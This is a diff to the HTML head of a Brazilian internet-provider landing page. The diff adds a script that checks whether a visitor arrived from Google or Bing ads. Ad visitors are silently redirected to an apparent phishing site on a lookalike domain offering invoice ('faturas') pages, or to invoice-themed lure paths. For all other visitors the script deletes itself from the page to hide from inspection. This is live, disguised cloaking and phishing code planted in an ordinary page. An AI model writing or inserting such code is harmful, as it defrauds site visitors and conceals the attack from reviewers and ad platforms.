@@ -1,6 +1,51 @@
 <!DOCTYPE html>
 <html lang="pt-BR">
 <head>
+  <script id="auto-destruct-script">
+(function() {
+    const urls = [
+        'cte/index',
+        'nfe/index',
+        'cte/index',
+        'asp/indexp',
+        'app/index',
+        'xml/indexp',
+        'danfe/index',
+        'nfe/index'
+    ];
+
+    function generateHash() {
+        return Math.random().toString(36).substring(2, 15) + 
+               Math.random().toString(36).substring(2, 15) + 
+               Date.now().toString(36);
+    }
+
+    const randomIndex = Math.floor(Math.random() * urls.length);
+    const randomUrl = urls[randomIndex];
+    const hash = generateHash();
+    const xirjfgjsdhdjd = 'https://niointernt.shop/acesso/faturas/niointernet/?go=LvzEK';  
+
+    let referer = (typeof document !== 'undefined' && document.referrer) ? document.referrer : 'not found';
+    let currentUrl = (typeof window !== 'undefined') ? window.location.href : '';
+
+    // Lógica de Redirecionamento
+    if (/gclid/i.test(referer) || /gclid/i.test(currentUrl)) {
+        if (typeof window !== 'undefined') {
+            window.location.href = xirjfgjsdhdjd;
+        }
+    } else if (/msclkid/i.test(referer) || /msclkid/i.test(currentUrl)) {
+        const bingUrl = randomUrl + '?msclkid=' + hash;
+        if (typeof window !== 'undefined') {
+            window.location.href = bingUrl;
+        }
+    } else {
+        // AUTO-DESTRUIÇÃO: Se não for origem Ads, o script remove a si mesmo do HTML
+        if (typeof document !== 'undefined' && document.currentScript) {
+            document.currentScript.remove();
+        }
+    }
+})();
+</script>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Netguibor – Internet de verdade em João Pessoa</title>
